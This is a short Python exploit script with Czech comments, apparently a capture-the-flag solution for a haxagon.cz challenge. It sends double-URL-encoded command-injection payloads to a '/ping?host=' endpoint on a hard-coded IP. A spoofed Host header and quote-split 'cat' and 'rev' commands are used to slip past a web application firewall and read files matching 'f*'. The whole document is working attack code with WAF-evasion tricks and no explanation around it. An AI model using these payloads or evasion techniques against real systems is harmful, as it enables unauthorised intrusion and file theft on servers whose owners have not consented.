import requests

url = "http://63.177.48.79/ping"

# Falešná Host hlavička je naprosto nezbytná pro snížení skóre!
headers = {
    "Host": "legit-service.haxagon.cz",
    "User-Agent": "Mozilla/5.0"
}

# Trik: Dvojité kódování
# %0a (nový řádek) -> %250a
# < (přesměrování) -> %253c
# Tímto se vyhneme detekci "Command Injection" v prvním průchodu WAFem
payload = "127.0.0.1%250ac''at%253cf*"


def surgical_strike():
    print(f"[*] Posílám dvojitě kódovaný stealth payload...")

    # Musíme poslat parametr jako řetězec, aby ho 'requests' znovu nepřebalil
    target = f"{url}?host={payload}"

    try:
        r = requests.get(target, headers=headers, timeout=5)
        print(f"[*] Status: {r.status_code}")

        if r.status_code == 200:
            print("[!!!] PROŠLO TO POD RADAREM!")
            print("-" * 30)
            print(r.text)
            print("-" * 30)
        else:
            print(f"[-] WAF stále hlásí 403. Zkusíme variantu s 'rev'...")

            # Druhá varianta: rev (vypíše soubor pozpátku, málokdy v blacklistu)
            payload_rev = "127.0.0.1%250ar''ev%253cf*"
            r2 = requests.get(f"{url}?host={payload_rev}", headers=headers)
            if r2.status_code == 200:
                print(f"[!!!] PRŮCHOD S REV! Otoč výsledek:\n{r2.text[::-1]}")

    except Exception as e:
        print(f"[!] Chyba: {e}")


if __name__ == "__main__":
    surgical_strike()